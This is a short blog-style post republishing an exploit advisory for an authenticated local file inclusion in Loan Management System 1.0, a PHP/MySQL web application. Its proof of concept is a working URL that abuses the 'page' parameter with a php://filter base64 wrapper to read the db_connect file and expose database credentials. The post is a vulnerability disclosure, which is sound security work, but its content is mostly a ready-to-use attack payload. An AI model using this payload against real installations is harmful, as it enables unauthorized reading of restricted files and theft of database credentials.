---
layout: post
title: Loan Management System 1.0 - Authenticated Local File Inclusion (index page)
tags: [CVE]
description: "Loan Management System 1.0 - Authenticated Local File Inclusion (index page)"

---

```
# Exploit Title: Loan Management System 1.0 - Authenticated Local File Inclusion (index page)
# Date: 2020-09-26
# Exploit Author: Thibault Galbourdin (Liodeus)
# Vendor Homepage: https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html
# Product Link: https://www.sourcecodester.com/download-code?nid=14471&title=Loan+Management+System+using+PHP%2FMySQL+with+Source+Code
# Tested on: Windows 10 + 7.4.10

# Description:
# An issue was discovered in Loan Management System 1.0. There is an authenticated Local File Inclusion
# (LFI) on the index page, the vulnerable parameter is page. Allowing an authenticated read restricted 
# files.

# POC

# Read database credentials
	http://127.0.0.1/index.php?page=php://filter/convert.base64-encode/resource=db_connect
```

